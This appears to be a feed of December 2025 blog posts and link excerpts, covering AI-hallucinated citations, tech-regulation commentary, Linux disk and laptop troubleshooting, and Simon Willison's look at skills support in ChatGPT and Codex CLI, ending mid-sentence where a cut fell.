move that will remove one of the most recognizable names in the
do-it-yourself PC upgrade market</p>
<h2>🔖 <a href="https://www.scientificamerican.com/article/ai-slop-is-spurring-record-requests-for-imaginary-journals/">AI Slop Is Spurring Record Requests for Imaginary Journals</a></h2>
<p>AI models not only point some users to false sources but also cause
problems for researchers and librarians, who end up wasting their time
looking for requested nonexistent records, says Library of Virginia
chief of researcher engagement Sarah Falls. Her library estimates that
15 percent of emailed reference questions it receives are now
ChatGPT-generated, and some include hallucinated citations for both
published works and unique primary source documents. “For our staff, it
is much harder to prove that a unique record doesn’t exist,” she says</p>
<h2>🔖 <a href="https://gameboat.bearblog.dev/the-resonant-computing-manifesto/">the resonant computing manifesto</a></h2>
<p>background: the resonant computing manifesto counts among its drafters
at least three xooglers with at least a decade of tenure each1; three
venture capitalists, one of whom is a general partner at a firm on Sand
Hill Road; two employees of github’s “let’s replace programmers with an
LLM” skunkworks; a guy who sold two AI startups and worked for the first
Trump administration’s Defense Department drafting its AI policy; an
employee at one of the Revolutionary AI Art Startups that lost the race
for mindshare a couple years ago; and the CEO of techdirt-cum-board
member of Bluesky PBLLC, the “decentralized” social media startup funded
by Jack Dorsey, Elon Musk, and crypto VCs2.</p>
<h2>🔖 <a href="https://www.superscript.com/posts/moats-and-ai-revisited/">Moats and AI Revisited</a></h2>
<p>What business models and positioning are defensible in an AI-powered
world? What moats will remain as AI grows more capable? Over the past
few months I’ve put these questions to everyone who will listen, and
then some, and incorporated the compelling answers into my list. It’s
time for a recap.</p>
<p>The list remains short, though the headings are broad. I speak to many
entrepreneurs and business operators and ask myself whether their
offerings fall under one or more of these headings. The vast majority do
not. That says to me that they will be overtaken by AI developments.
Maybe they will last 12 or 18 months, but it won’t be long.</p>
<h2>🔖 <a href="https://paulkrugman.substack.com/p/talking-with-paul-kedrosky">Talking With Paul Kedrosky</a></h2>
<p>I think it’s somewhat misunderstood what’s going on, but nevertheless, I
sometimes say “a data center full of GPUs is like a warehouse full of
bananas, that’s got a relatively short half life in terms of its
usefulness.” That’s important to keep in mind. That’s what makes it
different from prior CapEx spending. Moments like railroads, canals,
rural electrification, take your pick, because of the nature of the
perished ability of the thing that we’re investing in.</p>
<h2>🔖 <a href="https://cdegroot.com/programming/commonlisp/2025/11/26/cl-ql-asdf.html">Common Lisp, ASDF, and Quicklisp: packaging explained</a></h2>
<p>Common Lisp is old, and its inspiration is even older. It was developed
when there was zero consensus on how file systems worked, operating
systems were more incompatible than you can probably imagine, and that
age shows. It pinned down terminology way before other languages got to
the same point, and, as it happens so often, the late arrivals decided
that they needed different words and these words stuck</p>
<h2>🔖 <a href="https://m.youtube.com/watch?v=fzatT_xnVfA">OUR HOME FROZEN INTO ICE IN GREENLAND (181 Days of Winter)</a></h2>
<p>We spent the winter on our boat in the ice in Greenland. This is how it
all happened.</p>
<p>Film by Mikko-Pekka Karlin: / mpkarlin</p>
<h2>🔖 <a href="https://spaceofreasons.netlify.app/courses/frege2025/">Frege in Context</a></h2>
<p>Robert Brandom’s Fall 2025 Ph.D. Seminar at the University of
Pittsburgh.</p>
<h2>🔖 <a href="https://kappanonline.org/teach-like-a-luddite/">Teach like a Luddite</a></h2>
<p>What might today’s educators learn from the Luddites? How can their
strategies help us navigate our own moment of technological disruption?
Here, we offer three approaches to Luddite praxis, inspired by the
clothworkers’ resistance — not as prescriptions, but as starting points
for shaping our own responses to automation’s incursions into schools.</p>
<h2>🔖 <a href="https://en.wikipedia.org/wiki/Anniversary_(2025_film)">Anniversary (2025 film)</a></h2>
<p>Anniversary is a 2025 American dystopian political thriller film
directed by Jan Komasa and starring Diane Lane, Kyle Chandler, Madeline
Brewer, Zoey Deutch, Phoebe Dynevor, Mckenna Grace, Daryl McCormack, Sky
Yang and Dylan O’Brien. It was released on October 29, 2025. It received
mixed reviews from critics.</p>
<h2>🔖 <a href="https://daily.bandcamp.com/best-of-2025/the-best-experimental-music-of-2025">The Best Experimental Music of 2025</a></h2>
<p>Welcome to the year-end edition of Best Experimental Music on Bandcamp,
in which we’ve picked 12 of our favorites from 2025. Once again, all
kinds of amazing experimental music appeared on Bandcamp this year, and
it was our immense pleasure to listen to as much of it as we could, and
pass our favorites along to you. There were hundreds of releases that
could’ve made this list, but we trust that whatever the style, whomever
the artist, and whatever the story behind their music is, you’ll find
something to love. Presented in alphabetical order by artist, our
selections include avant-rock, longform drone, vocal explorations, and
cello narratives.</p>
<h2>🔖 <a href="https://arxiv.org/abs/2509.07043">ModellingScenarios for Carbon-aware Geographic Load Shifting of Compute Workloads</a></h2>
<p>We present an analytical model to evaluate the reductions in emissions
resulting from geographic load shifting. This model is optimistic as it
ignores issues of grid capacity, demand and curtailment. In other words,
real-world reductions will be smaller than the estimates. However, even
with these assumptions, the presented scenarios show that the realistic
reductions from carbon-aware geographic load shifting are small, of the
order of 5%. This is not enough to compensate the growth in emissions
from global data centre expansion.</p>
<h2>🔖 <a href="https://ottolenghi.co.uk/pages/recipes/braised-chickpeas-with-carrots-dates-and-feta">Braised chickpeas with carrots, dates and feta</a></h2>
<p>Serve with rice or flatbreads for a vegetarian main course; leave out
the feta for a vegan version. Soaking the chickpeas is necessary to
achieve the right degree of cooking, so don’t be tempted to skip this
stage.</p>
<h2>🔖 <a href="https://organizingmythoughts.org/you-cant-fight-fascism-while-defunding-libraries/">You Can’t Fight Fascism While Defunding Libraries</a></h2>
<p>We are living through a coordinated assault on knowledge. In a moment
when Big Tech is waging war on complex thought, a fascist government is
targeting higher education, and the media landscape is being demolished
by the same oligarchs driving this era of smash-and-grab politics,
libraries are under-appreciated outposts of struggle, sharing and
survival. They are sites of refuge, where curiosity is nurtured, where
people find shelter, education, entertainment, job assistance,
skill-building programs, and access to resources that would otherwise be
out of reach. “We do it all at the library,” Sara Heymann, a library
associate in the Chicago Public Library (CPL) system, recently told me.
“We do a lot of arts, science, and literacy programming. We host movie
nights. We have programs for helping people with their taxes, small
businesses, and mental health. We help people.”</p>

      <p>Just started watching &quot;Mr. Scorsese Reviews&quot; on Apple TV and it's like getting inside the head that came up with all those movies, with scenes from the movies in there too. What a gift.</p>

<p>The answer is that it is <code>/dev/sdb1</code> and that’s the backup disk. Well, that’s better than the laptop disk!</p>
<p>The disk is so old it doesn’t support <code>smartmon</code>, I think.</p>
<p>So, let’s unmount and check it:</p>
<pre><code>sudo umount /dev/sdb1
sudo fsck /dev/sdb1

</code></pre>
<p>The result of that was a single note:</p>
<pre><code>fsck from util-linux 2.41
e2fsck 1.47.2 (1-Jan-2025)

</code></pre>
<p>Now I’m going to try and find the bad blocks and mark them:</p>
<pre><code>sudo badblocks -sv /dev/sdb

</code></pre>
<p>This is going to take a long time.</p>
<p>The last time this happened to me was <a href="2006-07-09_Bad_Blocks_on_an_External_Drive">20 years ago</a>.</p>
<p>In the mean time, I found that old 1 TB hard disk I still had lying around, formatted it, created an ext4 filesystem on it, went back to <a href="2025-01-31-backup">my old instructions</a> and added its ID to the backup disks, setup a new Borg repository and started a run.</p>
<p>I think think I need to buy a new backup disk.</p>

      <h1>Pluralistic: Federal Wallet Inspectors (13 Dec 2025)</h1>

(date: 2025-12-13)
      <p>
      <p>Today's links Federal Wallet Inspectors: Does tech *really* move too fast to regulate? Hey look at this: Delights to delectate. Object permanence: Soda can Van de Graff; Amazon rents a copy of the web; Boardgame Remix Kit; No furniture photos please we're British; Youtube vs fair use; Carbon offsets are bullshit; Arkham model railroad; Happy Birthday is in the public domain; Ted Cruz hires Cambridge Analytica; The kid who wanted to join the NSA; Daddy Daughter Xmas Podcast 2020. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. Federal Wallet Inspectors (permalink) Look, I'm not trying to say that new technologies never raise gnarly new legal questions, but what I am saying is that a lot of the time, the &quot;new legal challenges&quot; raised by technology are somewhere between 95% to 100% bullshit, ginned up by none-too-bright tech bros and their investors, and then swallowed by regulators and lawmakers who are either so credulous they'd lose a game of peek-a-boo, or (likely) in on the scam. Take &quot;fintech.&quot; As Trashfuture's Riley Quinn is fond of saying, &quot;when you hear 'fintech,' think 'unregulated bank'&quot;: <a href="https://pluralistic.net/2022/03/02/shadow-banking-2-point-oh/#leverage">https://pluralistic.net/2022/03/02/shadow-banking-2-point-oh/#leverage</a> I mean, the whole history of banking is: &quot;Bankers think of a way to do reckless things that are wildly profitable (in the short term) and catastrophic (in the long term). They offer bribes and other corrupt incentives to their watchdogs to let them violate the rules, which leads to utter disaster.&quot; From the 19th century &quot;panics&quot; to the crash of '29 to the S&amp;L collapse to the 2008 Great Financial Crisis and beyond, this just keeps happening. Much of the time, the bankers involved have some tissue-thin explanation for why what they're doing isn't really a violation of the rules. Think of the lenders who, in the runup to the Great Financial Crisis, insisted that they weren't engaged in risky lending because they had a fancy equation that proved that the mortgage-backed securities they were issuing were all sound, and it was literally impossible that they'd all default at once. The fact that regulators were bamboozled by this is enraging. In hindsight (and for many of us at least, at the time), it's obvious that the bankers went to their watchdogs and said, &quot;We'd like to break the law,&quot; and the watchdogs said, &quot;Sure, but would you mind coming up with some excuse that I can repeat later when someone asks me why I let you do this crime?&quot; It's like in the old days of medical marijuana, where you'd get on a call with a dial-a-doc and say, &quot;Please can I have some weed?&quot; and the doc would say, &quot;Tell me about your headaches,&quot; and you'd say, &quot;Uh, I have headaches?&quot; and they'd say &quot;Great, here's your weed!&quot; The alternative is that these regulators are so bafflingly stupid that they can't be trusted to dress themselves. &quot;My stablecoin is a fit financial instrument to integrate into the financial system&quot; is as credible a wheeze as some crypto bro walking up to Cory Booker, flashing a homemade badge, and snapping out, &quot;Federal Wallet Inspector, hand it over.&quot; I mean, at that point, I kind of hope they're corrupt, because the alternative is that they are basically a brainstem and a couple of eyestalks in a suit. What I'm saying is, &quot;We just can't figure out if crypto is violating finance laws&quot; is a statement that can only be attributed to someone very stupid, or in on the game. Speaking of &quot;someone very stupid, or in on the game,&quot; Congress just killed a rule that would have guaranteed that the US military could repair its own materiel: <a href="https://federalnewsnetwork.com/congress/2025/12/congress-quietly-strips-right-to-repair-provisions-from-2026-ndaa-despite-wide-support/">https://federalnewsnetwork.com/congress/2025/12/congress-quietly-strips-right-to-repair-provisions-from-2026-ndaa-despite-wide-support/</a> Military right to repair is the most brainless of all possible no-brainers. When a generator breaks down in the field – even in an active war-zone – the US military has to ship it back to America to be serviced by the manufacturer. That's not because you can't train a Marine to fix a generator – it's because the contractual and technical restrictions that military contractors insist on ban the military from fixing its stuff: <a href="https://www.pogo.org/fact-sheets/fact-sheet-the-right-to-repair-for-the-united-states-military">https://www.pogo.org/fact-sheets/fact-sheet-the-right-to-repair-for-the-united-states-military</a> This violates a very old principle in sound military administration. Abraham Lincoln insisted that the contractors who supplied the Union army had to use standardized tooling and ammo, because it would be very embarrassing for the Commander-in-Chief to have to stand on the field at Gettysburg with a megaphone and shout, &quot;Sorry boys, war's canceled this week, our sole supplier's gone on vacation.&quot; And yet, after mergers of large military contractors resulted in just a handful of &quot;primary&quot; companies serving the Pentagon, private equity vampires snapped up all the subcontractors who were sole-source suppliers of parts to those giants. They slashed the prices of those parts so that the primary contractors used as many as possible in the materiel they provided to the US DoD, and then raised the prices of replacement parts, some with 10,000% margins, which the Pentagon now has to pay for so long as they own those jets and other big-ticket items: <a href="https://pluralistic.net/2021/01/29/fractal-bullshit/#dayenu">https://pluralistic.net/2021/01/29/fractal-bullshit/#dayenu</a> This isn't a complicated scam. It's super straightforward, and the right to repair rule that Congress killed addressed it head on. But Congressional enemies of this bill insisted that it would have untold &quot;unintended consequences&quot; and instead passed a complex rule, riddled with loopholes, because there was something unique and subtle about the blunt issue of price-gouging: <a href="https://www.warren.senate.gov/imo/media/doc/final">https://www.warren.senate.gov/imo/media/doc/final</a>_-_warren_letter_to_dod_re_right_to_repair_consequences_092524.pdf Either these lawmakers are so stupid that they fell for the ole &quot;Federal Wallet Inspector&quot; gambit, or they're in on the game. I know which explanation my money is on. Maybe this has already occurred to you, but lately I've come to realize that there's another dimension to this, a way in which critics of tech help this gambit along. After all, it's pretty common for tech critics to preface their critiques with words to the effect of, &quot;Of course, this technology has raced ahead of regulators' ability to keep pace with it. Those dastardly tech-bros have slipped the net once again!&quot; The unspoken (and sometimes very loudly spoken) corollary of this is, &quot;Only a tech-critic as perspicacious and forward looking as me is capable of matching wits with those slippery tech-bros, and I have formulated a sui generis policy prescription that can head them off at the pass.&quot; Take the problem of deepfakes, including deepfake porn. There's a pretty straightforward policy response to this: a privacy law that allows you to prevent the abuse of your private information (including to create deepfakes) that unlawfully process your personal information for an illegitimate purpose. To make sure that this law can be enforced, include a &quot;private right of action,&quot; which means that individuals can sue to enforce it (and activist orgs and no-win/no-fee lawyers can sue on their behalf). That way, you can get justice even if the state Attorney General or the federal Department of Justice decides not to take your case. Privacy law is a great idea. It can navigate nuances, like the fact that privacy is collective, not individual – for example, it can intervene when your family members give their (your) DNA to a scam like 23andme, or when a friend posts photos of you online: <a href="https://jacobin.com/2021/05/cory-doctorow-interview-bill-gates-intellectual-property">https://jacobin.com/2021/05/cory-doctorow-interview-bill-gates-intellectual-property</a> But privacy law gets a bad rap. In the EU, they've had the GDPR – a big, muscular privacy law – for nine years, and all it's really done is drown the continent in cookie-consent pop-ups. But that's not because the GDPR is flawed, it's because Ireland is a tax-haven that has lured in the world's worst corporate privacy-violators, and to keep them from moving to another tax haven (like Malta or Cyprus or Luxembourg), it has to turn itself into a crime-haven. So for the entire life of the GDPR, all the important privacy cases in Europe have gone to Ireland, and died there: <a href="https://pluralistic.net/2025/12/01/erin-go-blagged/#big-tech-omerta">https://pluralistic.net/2025/12/01/erin-go-blagged/#big-tech-omerta</a> Now, again, this isn't a complicated technical question that is hard to resolve through regulation. It's just boring old corruption. I'm not saying that corruption is easy to solve, but I am saying that it's not complicated. Irish politicians made the country's economy dependent on the Irish state facilitating criminal activity by American firms. The EU doesn't want to provoke a constitutional crisis by forcing Ireland (and the EU's other crime-havens) to halt this behavior. That's a hard thing to do! It's just not a complicated thing to do. The routine violations of EU privacy law by American tech companies aren't the result of &quot;tech racing ahead of the law.&quot; It's just corruption. You can't fix corruption by passing more laws; they'll just be corruptly enforced, too. But thanks to a mix of bad incentives – politicians wanting to be seen to do something without actually upsetting the apple-cart; AI critics wanting to inflate their importance by claiming that they're fighting something novel and complex, as opposed to something that's merely boring and hard – we get policy proposals that will likely worsen the problem. Take Denmark's decision to fight deepfakes by creating a new copyright over your likeness: <a href="https://www.theguardian.com/technology/2025/jun/27/deepfakes-denmark-copyright-law-artificial-intelligence">https://www.theguardian.com/technology/2025/jun/27/deepfakes-denmark-copyright-law-artificial-intelligence</a> Copyright – a property right – is an incredibly bad way to deal with human rights like privacy. For one thing, it makes privacy into a luxury good that only the wealthy can afford (remember, a discount for clicking through a waiver of your privacy right is the same thing as an extra charge for not waiving your privacy rights). For another, property rights are very poorly suited to managing things that have joint ownership, such as private information. As soon as you turn private information into private property, you have to answer questions like, &quot;Which twin owns the right to their face&quot; and &quot;Who owns the right to the fact that your abusive mother is your mother – you, or her? And if it's her, does she get to stop you from publishing a memoir about the abuse?&quot; Copyright – a state-backed transferable monopoly over expression – is really hard to get right. Legislatures and courts have struggled to balance free expression and copyright for centuries, and there's a complex web of &quot;limitations and exceptions&quot; to copyright. Privacy is also incredibly complex, and has its own limitations and exceptions, and they are very different from copyright's limits. I mean, they have to be: privacy rules defend your human right to a personal zone of autonomy; copyright is intended to create economic incentives to produce new creative works. It would be very weird if the same rules served both ends. I can't believe that Denmark's legislators failed to consider privacy as the solution to deepfakes. If they did, they are very, very stupid. Rather, they decided that fighting the corruption that keeps privacy law from being enforced in the EU was too hard, so they just did something performative, creating a raft of new problems, without solving the old one. Here in the USA, there's lots of lawmakers who are falling into this trap. Take the response to chatbots that give harmful advice to children and teens. The answer that many American politicians (as well as lawmakers abroad, in Australia, Canada, the UK and elsewhere) have come up with is to force AI companies to identify who is and is not a child and treat them differently. This boils down to a requirement for AI companies to collect much more information on their users (to establish their age), which means that all the AI harms that stem from privacy violations (AI algorithms that steal wages, hike prices, discriminate in hiring and lending and policing, etc) are now even harder to stop. A simple alternative to this would be updating privacy law to limit how AI companies can gather and use everyone's data – which would mean that you could protect kids from privacy invasions without (paradoxically) requiring them (and you) to disclose all kinds of private information to determine how old they are. The insistence – by AI critics and AI boosters – that AI is so different from other technologies that you can't address it by limiting the collection, retention and processing of private information is a way in which AI critics and AI hucksters end up colluding to promote a view of AI as an exceptional technology. It's not. AI is a normal technology: <a href="https://www.aisnakeoil.com/p/ai-as-normal-technology">https://www.aisnakeoil.com/p/ai-as-normal-technology</a> Sometimes this argument descends into grimly hilarious parody. Argue for limits on AI companies' collection, retention and processing of private information and AI boosters will tell you that this would require so much labor-intensive discernment about training data that it would make it impossible to continue training AI until it becomes intelligent enough to solve all our problems. But also, when you press the issue, they'll sometimes say that AI is already so &quot;intelligent&quot; that it can derive (that is, guess) private information about you without needing your data, so a new privacy law won't help. In other words, applying privacy limitations to AI means we'll never get a &quot;superintelligence,&quot;; and also, we already have a superintelligence so there's no point in applying privacy limitations to AI. It's true that technology can give rise to novel regulatory challenges, but it's also true that claiming that a technology is so novel that existing regulation can't resolve its problems is just a way of buying time to commit more crimes before the regulators finally realize that your flashy new technology is just a boring old scam.

      <h1>My day as an augmented technical writer in 2030</h1>

(date: 2025-12-13)
      <p>
      <p>Instead of writing my tech comms predictions for next year <a href="https://passo.uno/tech-writing-predictions-2025/">like I did in 2024</a>, I’ve written a fictionalized account of my day as a technical writer in 2030. It’ll be interesting to see whether we get there or not. Take it as a window into a possible future, one where AI usage is safer, more regulated, and better integrated with our workflows (as it should be).</p>

      <h1>Ann Greenberg's idea</h1>

(date: 2025-12-13)
      <p>
      <p>An idea I <a href="https://www.facebook.com/dave.winer.12/posts/pfbid02Ggdsc3q4Z9qaz8uE1H3yc8qBAJnz3YhuWWS8GiCyaQdVPRF2BUWTWTQuxFxzHLLnl?notif_id=1765601890685451&amp;notif_t=feedback_reaction_generic&amp;ref=notif">posted</a> on Facebook in 2021 about an app I wanted.</p>
<ul>
<li>Here's an idea. I have a drone that communicates with my peloton via satellite, so it's not constrained by range. I can send the drone anywhere I like, but I have to ride there on my peloton. Obviously what I see on my screen is what the drone sees. I think it would quickly become addictive, not that peloton isn't already addictive.</li>
</ul>
<p>That was yesterday. Today I found myself writing a <a href="https://www.facebook.com/dave.winer.12/posts/pfbid02Ggdsc3q4Z9qaz8uE1H3yc8qBAJnz3YhuWWS8GiCyaQdVPRF2BUWTWTQuxFxzHLLnl?comment_id=1586870055654260&amp;reply_comment_id=881509054436484">comment</a> that was really a blog post.</p>
<ul>
<li><a href="https://www.anngreenberg.com/">Ann Greenberg</a>, the <a href="https://www.anngreenberg.com/inventions">visionary</a>, was <a href="https://www.linkedin.com/in/anngreenberg/">trying</a> to explain this to me almost 20 years ago and my mind couldn't comprehend the possibility. but ann, don't take it personally -- i don't even listen to myself. i have spent most of this year struggling with a problem i solved in 2014. there was like this moment, omg this is exactly what i tried to do with twitter, but now i have control of the api, so i can actually make it work. my gift to you Ann is this -- we all should've listened to you.</li>
</ul>
<p>We're at that point in our lives I think when reaching out like this is totally the right thing to do. Because it's only until this point that things quiet down enough that you can realize things like this.</p>
<p>BTW, the idea of a comment not being a blog post will require a lot of explanation in a few years. Imho of course.</p>

<p>If the part of programming you enjoy most is the physical act of writing code, then agents will feel beside the point. You’re already where you want to be, even just with some Copilot or Cursor-style intelligent code auto completion, which makes you faster while still leaving you fully in the driver’s seat about the code that gets written.</p>
<p>But if the part you care about is the decision-making around the code, agents feel like they clear space. They take care of the mechanical expression and leave you with judgment, tradeoffs, and intent. Because truly, for someone at my experience level, that is my core value offering anyway. When I spend time actually typing code these days with my own fingers, it feels like a waste of my time.</p>

<p>I suppose it’s not clear to me what a ‘good’ window into unreliable, systemically toxic systems accomplishes, or how it changes anything that matters for the better, or what that idea even means at all. I don’t understand how “ethical AI” isn’t just “clean coal” or “natural gas.” The power of normalization as four generations are raised breathing low doses of aerosolized neurotoxins; the alternative was called “unleaded”, but the poison was called “regular gas”.</p>
<p>There’s a real technology here, somewhere. Stochastic pattern recognition seems like a powerful tool for solving some problems. But solving a problem starts at the problem, not working backwards from the tools.</p>

(date: 2025-12-12)
      <p>
      <h1>2025-12-13 MNT Pocket Reform notes</h1>
<blockquote>
<p>As is often the case, I sit on a cushion in the living room, typing into the MNT Pocket Reform laptop while Claudia is lying on the sofa, reading a magazine.</p>
</blockquote>
<p>After a recent upgrade, poweroff, shutdown and friends stopped doing their job. The system starts shutting down; only the keyboard lights are still on, then nothing happens for a few seconds and then the Pocket Reform reboots again.</p>
<p>I posted on the community forums, asking for help, and <em>josch</em> came to the rescue once again.
The key to finding the problem is running <code>reform-check</code>.</p>
<p>Here’s his breakdown:</p>
<pre><code>E: Cannot get version of linux-image-mnt-reform-arm64 as it is not installed

</code></pre>
<blockquote>
<p>Without having that meta-package installed, it will be more tricky to keep your kernel up-to-date.</p>
</blockquote>
<pre><code>W: unable to obtain version of system controller firmware -- firmware too old?
W: unable to obtain version of keyboard firmware -- firmware too old?

</code></pre>
<blockquote>
<p>You should look into upgrading your sysctl and keyboard firmware. The versions after the one you have (too old to retrieve the exact version) contain important fixes for the stability of keyboard/sysctl communication.</p>
</blockquote>
<pre><code>E: linux-headers-mnt-reform-arm64 is not installed -- cannot compile reform2_lpc module

</code></pre>
<p>This is why you cannot shut-down properly. Without the <code>reform2_lpc</code> module, the system cannot tell your Pocket to switch off.</p>
<pre><code>E: reform2_lpc is not loaded (battery status information will be missing)
E: /usr/lib/modules/6.17.11-mnt-reform-arm64/updates/dkms/reform2_lpc.ko{.xz} does not exist

</code></pre>
<blockquote>
<p>More errors because the module cannot be compiled above.</p>
</blockquote>
<p>I installed <code>linux-image-mnt-reform-arm64</code> and <code>linux-headers-mnt-reform-arm64</code> but the <code>reform2_lpc</code> is still uncompiled.</p>
<p>I’m not sure how to do this but guessed that <code>sudo dpkg-reconfigure reform2-lpc-dkms</code> was the command I needed. To load it, <code>sudo modprobe reform2-lpc</code> … and now shutdown works! 😍</p>
<p>I found information about the dynamic kernel module system (dkms) on this very blog. Sometimes it is amazing. And then I searched for an appropriate package.</p>
<p>As for the firmware, <em>josch</em> said:</p>
<blockquote>
<p>Since your firmware is too old to be updated via fwupd, you need to do it manually once: <a href="https://source.mnt.re/reform/pocket-reform/-/releases/20250724#how-to-update-your-mnt-pocket-reform-firmware">How to Update your MNT Pocket Reform Firmware</a>.
After you are on that firmware version, you can use gnome-firmware (the GUI way) or <code>fwupd</code> (the console way) to update to the latest version.</p>
</blockquote>
<p>Thanks, <em>josch</em>!</p>

      <h1>OpenAI are quietly adopting skills, now available in ChatGPT and Codex CLI</h1>

(date: 2025-12-12)
      <p>
      <p>One of the things that most excited me about <a href="https://simonwillison.net/2025/Oct/16/claude-skills/">Anthropic's new Skills mechanism</a> back in October is how easy it looked for other platforms to implement. A skill is just a folder with a Markdown file and some optional extra resources and scripts, so any LLM tool with the ability to navigate and read from a filesystem should be capable of using them. It turns out OpenAI are doing exactly that, with skills support quietly showing up in both their Codex CLI tool and now also in ChatGPT itself.</p>
<h4>Skills in ChatGPT</h4>
<p>I learned about this <a href="https://x.com/elias_judin/status/1999491647563006171">from Elias Judin</a> this morning. It turns out the Code Interpreter feature of ChatGPT now has a new <code>/home/oai/skills</code> folder which you can access simply by prompting:</p>
<blockquote>
<p><code>Create a zip file of /home/oai/skills</code></p>
</blockquote>
<p>I <a href="https://chatgpt.com/share/693c9645-caa4-8006-9302-0a9226ea7599">tried that myself</a> and got back <a href="https://static.simonwillison.net/static/cors-allow/2025/skills.zip">this zip file</a>. Here's <a href="https://tools.simonwillison.net/zip-wheel-explorer?url=https%3A%2F%2Fstatic.simonwillison.net%2Fstatic%2Fcors-allow%2F2025%2Fskills.zip">a UI for exploring its content</a> ( <a href="https://tools.simonwillison.net/colophon#zip-wheel-explorer.html">more about that tool</a>).</p>
<p><img src="https://static.simonwillison.net/static/2025/skills-explore.jpg" alt="Screenshot of file explorer. Files skills/docs/render_docsx.py and skills/docs/skill.md and skills/pdfs/ and skills/pdfs/skill.md - that last one is expanded and reads: # PDF reading, creation, and review guidance  ## Reading PDFs - Use pdftoppm -png OUTDIR/BASENAME.pdf OUTDIR/BASENAME to convert PDFs to PNGs. - Then open the PNGs and read the images. - pdfplumber is also installed and can be used to read PDFs. It can be used as a complementary tool to pdftoppm but not replacing it. - Only do python printing as a last resort because you will miss important details with text extraction (e.g. figures, tables, diagrams).  ## Primary tooling for creating PDFs - Generate PDFs programmatically with reportlab as the primary tool. In most cases, you should use reportlab to create PDFs. - If there are other packages you think are necessary for the task (eg. pypdf, pyMuPDF), you can use them but you may need topip install them first. - After each meaningful update—content additions, layout adjustments, or style changes—render the PDF to images to check layout fidelity:   - pdftoppm -png INPUT_PDF OUTPUT_PREFIX - Inspect every exported PNG before continuing work. If anything looks off, fix the source and re-run the render → inspect loop until the pages are clean.  ## Quality expectations - Maintain a polished, intentional visual design: consistent typography, spacing, margins, color palette, and clear section breaks across all pages. - Avoid major rendering issues—no clipped text, overlapping elements, black squares, broken tables, or unreadable glyphs. The rendered pages should look like a curated document, not raw template output. - Charts, tables, diagrams, and images must be sharp, well-aligned, and properly labeled in the PNGs. Legends and axes should be readable without excessive zoom. - Text must be readable at normal viewing size; avoid walls of filler text or dense, unstructured bullet lists. Use whitespace to separate ideas. - Never use the U+2011 non-breaking hyphen or other unicode dashes as they will not be"></p>
<p>So far they cover spreadsheets, docx and PDFs. Interestingly their chosen approach for PDFs and documents is to convert them to rendered per-page PNGs and then pass those through their vision-enabled GPT models, presumably to maintain information from layout and graphics that would be lost if they just ran text extraction.</p>

They look very similar to Anthropic's implementation of the same kind of idea, currently published in their <a href="https://github.com/anthropics/skills/tree/main/skills">anthropics/skills</a> repository.</p>
<p>I tried it out by prompting:</p>
<blockquote>
<p>Create a PDF with a summary of the rimu tree situation right now and what it means for kakapo breeding season</p>
</blockquote>
<p>Sure enough, GPT-5.2 Thinking started with:</p>
<blockquote>
<p>Reading skill.md for PDF creation guidelines</p>
</blockquote>
<p>Then:</p>
<blockquote>
<p>Searching rimu mast and Kākāpō 2025 breeding status</p>
</blockquote>
<p>It took <a href="https://chatgpt.com/share/693ca54b-f770-8006-904b-9f31a585180a">just over eleven minutes</a> to produce <a href="https://static.simonwillison.net/static/cors-allow/2025/rimu_kakapo_breeding_brief.pdf">this PDF</a>, which was long enough that I had Claude Code for web <a href="https://github.com/simonw/tools/pull/155">build me a custom PDF viewing tool</a> while I waited.</p>
<p><a href="https://tools.simonwillison.net/view-pdf?url=https%3A%2F%2Fstatic.simonwillison.net%2Fstatic%2Fcors-allow%2F2025%2Frimu_kakapo_breeding_brief.pdf">Here's ChatGPT's PDF in that tool</a>.</p>
<p><img src="https://static.simonwillison.net/static/2025/rimu.jpg" alt="Screenshot of my tool. There is a URL at the top, a Load PDF button and pagination controls. Then the PDF itself is shown, which reads: Rimu mast status and what it means for the kākāpō breeding season Summary as of 12 December 2025 (Pacific/Auckland context) Kākāpō breeding is tightly linked to rimu (Dacrydium cupressinum) mast events: when rimu trees set and ripen large amounts of fruit, female kākāpō are much more likely to nest, and more chicks can be successfully raised. Current monitoring indicates an unusually strong rimu fruiting signal heading into the 2025/26 season, which sets the stage for a potentially large breeding year in 2026.^1,2 Key numbers at a glance Kākāpō population (official DOC count) 237 birds alive Breeding trigger (rimu fruiting)&gt;10% of rimu branch tips bearing fruit Forecast rimu fruiting for 2026 (DOC monitoring) Around 50–60% fruiting across breeding islands¹Breeding-age females (DOC 2025 planning figure)About 87 females (potentially nearly all could nest)"></p>
<p>(I am <strong>very excited</strong> about <a href="https://www.auckland.ac.nz/en/news/2025/12/03/bumper-breeding-season-for-kakapo-on-the-cards.html">Kākāpō breeding season this year</a>.)</p>
<p>The reason it took so long is that it was fastidious about looking at and tweaking its own work. I appreciated that at one point it tried rendering the PDF and noticed that the macrons in kākāpō were not supported by the chosen font, so it switched to something else:</p>
<p><img src="https://static.simonwillison.net/static/2025/skills-macrons.jpg" alt="ChatGPT screenshot. Analyzed image. There's an image of a page of PDF with obvious black blocks on some of the letters in the heading. It then says: Fixing font issues with macrons. The page is showing black squares for words like &quot;kākāpō,&quot; probably because Helvetica can't handle macrons. I'll switch to a font that supports them, such as DejaVu Sans or Noto Sans. I'll register both regular and bold fonts, then apply them to the document. I'll update the footer to note the issue with Helvetica. Time to rebuild the PDF!"></p>
<h4>Skills in Codex CLI</h4>
<p>Meanwhile, two weeks ago OpenAI's open source Codex CLI tool landed a PR titled <a href="https://github.com/openai/codex/pull/7412">feat: experimental support for skills.md</a>. The most recent docs for that are in <a href="https://github.com/openai/codex/blob/main/docs/skills.md">docs/skills.md</a>.</p>
<p>The documentation suggests that any folder in <code>~/.codex/skills</code> will be treated as a skill.</p>
<p>I dug around and found the code that generates the prompt that drives the skill system in <a href="https://github.com/openai/codex/blob/ad7b9d63c326d5c92049abd16f9f5fb64a573a69/codex-rs/core/src/skills/render.rs#L20-L38">codex-rs/core/src/skills/render.rs</a> - here's a Gist with <a href="https://gist.github.com/simonw/25f2c3a9e350274bc2b76a79bc8ae8b2">a more readable version of that prompt</a>.</p>
<p>I <a href="https://claude.ai/share/0a9b369b-f868-4065-91d1-fd646c5db3f4">used Claude Opus 4.5's skill authoring skill</a> to create <a href="https://github.com/datasette/skill">this skill for creating Datasette plugins</a>, then installed it into my Codex CLI skills folder like this:</p>
<pre><code>git clone https://github.com/datasette/skill \
  ~/.codex/skills/datasette-plugin
</code></pre>
<p>You have to run Codex with the <code>--enable skills</code> option. I ran this:</p>
